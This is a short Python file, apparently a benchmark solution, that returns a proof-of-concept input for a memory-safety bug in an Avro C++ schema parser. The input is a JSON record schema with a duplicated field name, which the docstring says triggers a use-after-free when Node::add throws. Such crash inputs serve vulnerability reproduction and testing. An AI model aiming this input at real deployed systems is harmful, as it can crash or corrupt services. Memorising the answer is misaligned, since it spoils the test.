import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The problem identifies a Heap Use After Free vulnerability in 'arvo' (likely a typo for 'avro' i.e., Apache Avro C++)
        caused when Node::add throws an exception. This typically occurs during schema parsing when an invalid
        structure is added, such as a duplicate field name in a record or a duplicate type in a union.
        
        The provided PoC constructs a minimal JSON schema for an Avro record with two fields having the same name.
        This causes Node::add (specifically NodeRecord::doAddLeaf) to throw an exception, triggering the double-free
        condition in the cleanup logic.
        """
        # Minimal JSON schema triggering the double-free via duplicate field name in a record.
        # Length is approximately 89 bytes.
        return b'{"type":"record","name":"a","fields":[{"name":"b","type":"int"},{"name":"b","type":"int"}]}'